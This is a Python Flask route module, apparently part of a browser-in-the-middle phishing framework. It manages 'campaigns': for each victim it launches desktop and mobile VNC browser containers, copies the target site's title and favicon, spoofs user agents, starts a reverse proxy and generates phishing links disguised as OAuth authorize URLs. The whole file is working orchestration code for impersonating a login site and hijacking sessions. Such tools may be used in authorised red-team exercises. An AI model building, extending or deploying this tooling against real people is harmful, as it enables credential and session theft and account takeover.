import os
import secrets
import uuid

from flask import Blueprint, render_template, redirect, url_for, request, flash, current_app
from flask_login import login_required

from ..models import db, Campaign, CampaignUser, Link
from .. import docker_manager
import docker.errors

campaigns_bp = Blueprint("campaigns", __name__)


@campaigns_bp.route("/dashboard")
@login_required
def dashboard():
    campaigns = Campaign.query.order_by(Campaign.created_at.desc()).all()
    return render_template("dashboard.html", campaigns=campaigns)


@campaigns_bp.route("/campaigns")
@login_required
def list_campaigns():
    campaigns = Campaign.query.order_by(Campaign.created_at.desc()).all()
    return render_template("campaigns/list.html", campaigns=campaigns)


@campaigns_bp.route("/campaigns/create", methods=["GET", "POST"])
@login_required
def create():
    if request.method == "POST":
        campaign = Campaign(
            name=request.form.get("name", ""),
            domain=request.form.get("domain", ""),
            target=request.form.get("target", ""),
            num_users=int(request.form.get("num_users", 1)),
            ssl=request.form.get("ssl") == "on",
            cert_path=request.form.get("cert_path", ""),
            key_path=request.form.get("key_path", ""),
            useragent=request.form.get("useragent", ""),
            custom_param=request.form.get("custom_param", ""),
            export_format=request.form.get("export_format", "default"),
            redirect=request.form.get("redirect") == "on",
            zip_profile=request.form.get("zip_profile") == "on",
            browser=request.form.get("browser", "firefox"),
            admin_password=secrets.token_hex(16),
            status="created",
        )
        db.session.add(campaign)
        db.session.commit()
        flash("Campaign created. Click Launch to start containers.", "success")
        return redirect(url_for("campaigns.detail", campaign_id=campaign.id))
    return render_template("campaigns/create.html")


@campaigns_bp.route("/campaigns/<int:campaign_id>")
@login_required
def detail(campaign_id):
    campaign = Campaign.query.get_or_404(campaign_id)
    users = CampaignUser.query.filter_by(campaign_id=campaign_id).all()
    links = Link.query.filter_by(campaign_id=campaign_id).all()
    return render_template("campaigns/detail.html", campaign=campaign, users=users, links=links)


@campaigns_bp.route("/campaigns/<int:campaign_id>/launch", methods=["POST"])
@login_required
def launch(campaign_id):
    campaign = Campaign.query.get_or_404(campaign_id)

    if campaign.status == "running":
        flash("Campaign is already running.", "warning")
        return redirect(url_for("campaigns.detail", campaign_id=campaign_id))

    # Pre-flight checks
    ok, msg = docker_manager.check_docker_available()
    if not ok:
        flash(f"Docker is not available: {msg}", "error")
        return redirect(url_for("campaigns.detail", campaign_id=campaign_id))

    if campaign.browser == "chrome":
        required_images = ["cvnc-docker", "cmvnc-docker", "rev-proxy"]
    else:
        required_images = ["vnc-docker", "mvnc-docker", "rev-proxy"]
    for img in required_images:
        if not docker_manager.check_image_exists(img):
            flash(f"Docker image '{img}' not found. Run ./setup.sh install first.", "error")
            return redirect(url_for("campaigns.detail", campaign_id=campaign_id))

    output_dir = current_app.config["OUTPUT_DIR"]
    ico_path = os.path.join(output_dir, "novnc.ico")

    # Fetch page title and favicon
    campaign.page_title = docker_manager.fetch_page_title(campaign.target)
    docker_manager.fetch_favicon(campaign.target, ico_path)
    db.session.commit()

    # Always use HTTPS since nginx handles SSL termination
    scheme = "https"
    campaign_users = []
    created_containers = []  # Track containers for cleanup on failure

    try:
        # Create VNC containers for each user
        for i in range(1, campaign.num_users + 1):
            token = str(uuid.uuid4())
            vnc_num = i * 2 - 1
            mvnc_num = i * 2

            # Create desktop VNC container
            try:
                vnc_name, vnc_pw, vnc_container = docker_manager.create_vnc_container(vnc_num, is_mobile=False, browser=campaign.browser)
                created_containers.append(vnc_name)
            except Exception as e:
                raise RuntimeError(f"Failed to create desktop container for user {i}: {e}")

            # Create mobile VNC container
            try:
                mvnc_name, mvnc_pw, mvnc_container = docker_manager.create_vnc_container(mvnc_num, is_mobile=True, browser=campaign.browser)
                created_containers.append(mvnc_name)
            except Exception as e:
                raise RuntimeError(f"Failed to create mobile container for user {i}: {e}")

            # Configure desktop container
            try:
                vnc_ip = docker_manager.configure_vnc_container(
                    vnc_name, is_mobile=False, useragent=campaign.useragent,
                    page_title=campaign.page_title, target=campaign.target,
                    domain=campaign.domain, ssl=campaign.ssl,
                    redirect=campaign.redirect, ico_path=ico_path,
                    browser=campaign.browser
                )
            except Exception as e:
                raise RuntimeError(f"Failed to configure desktop container for user {i}: {e}")

            # Configure mobile container
            try:
                mvnc_ip = docker_manager.configure_vnc_container(
                    mvnc_name, is_mobile=True, useragent=campaign.useragent,
                    page_title=campaign.page_title, target=campaign.target,
                    domain=campaign.domain, ssl=campaign.ssl,
                    redirect=campaign.redirect, ico_path=ico_path,
                    browser=campaign.browser
                )
            except Exception as e:
                raise RuntimeError(f"Failed to configure mobile container for user {i}: {e}")

            # Create campaign user record
            cu = CampaignUser(
                campaign_id=campaign.id,
                user_num=i,
                vnc_container=vnc_name,
                mvnc_container=mvnc_name,
                vnc_password=vnc_pw,
                mvnc_password=mvnc_pw,
                vnc_ip=vnc_ip or "",
                mvnc_ip=mvnc_ip or "",
                token=token,
                status="running",
            )
            db.session.add(cu)
            campaign_users.append(cu)

            # Generate phishing link
            if campaign.custom_param:
                url = f"{scheme}://{campaign.domain}/v{i}/{campaign.custom_param}"
            else:
                url = f"{scheme}://{campaign.domain}/v{i}/oauth2/authorize?access-token={token}"

            link = Link(campaign_id=campaign.id, user_num=i, url=url)
            db.session.add(link)

        db.session.commit()

        # Start the reverse proxy with all container configs
        admin_pw = campaign.admin_password or secrets.token_hex(16)
        campaign.admin_password = admin_pw

        success, message = docker_manager.start_rev_proxy(
            campaign, campaign_users, admin_pw, ico_path=ico_path
        )
        if not success:
            raise RuntimeError(f"Rev-proxy failed: {message}")

        created_containers.append("rev-proxy")

        campaign.status = "running"
        db.session.commit()

        flash(f"Campaign launched with {campaign.num_users} user(s).", "success")

    except Exception as e:
        # Cleanup all created containers on failure
        db.session.rollback()
        client = docker_manager.get_client()
        for name in created_containers:
            try:
                c = client.containers.get(name)
                c.remove(force=True)
            except docker.errors.NotFound:
                pass
            except Exception:
                pass
        # Remove any campaign users that were partially created
        CampaignUser.query.filter_by(campaign_id=campaign.id).delete()
        Link.query.filter_by(campaign_id=campaign.id).delete()
        db.session.commit()
        flash(f"Failed to launch campaign: {e}", "error")

    return redirect(url_for("campaigns.detail", campaign_id=campaign_id))


@campaigns_bp.route("/campaigns/<int:campaign_id>/stop", methods=["POST"])
@login_required
def stop(campaign_id):
    campaign = Campaign.query.get_or_404(campaign_id)
    users = CampaignUser.query.filter_by(campaign_id=campaign_id).all()
    docker_manager.remove_campaign_containers(users)
    campaign.status = "stopped"
    for u in users:
        u.status = "disconnected"
    db.session.commit()
    flash("Campaign stopped.", "info")
    return redirect(url_for("campaigns.detail", campaign_id=campaign_id))


@campaigns_bp.route("/campaigns/<int:campaign_id>/delete", methods=["POST"])
@login_required
def delete(campaign_id):
    campaign = Campaign.query.get_or_404(campaign_id)
    if campaign.status == "running":
        users = CampaignUser.query.filter_by(campaign_id=campaign_id).all()
        docker_manager.remove_campaign_containers(users)
    db.session.delete(campaign)
    db.session.commit()
    flash("Campaign deleted.", "info")
    return redirect(url_for("campaigns.dashboard"))


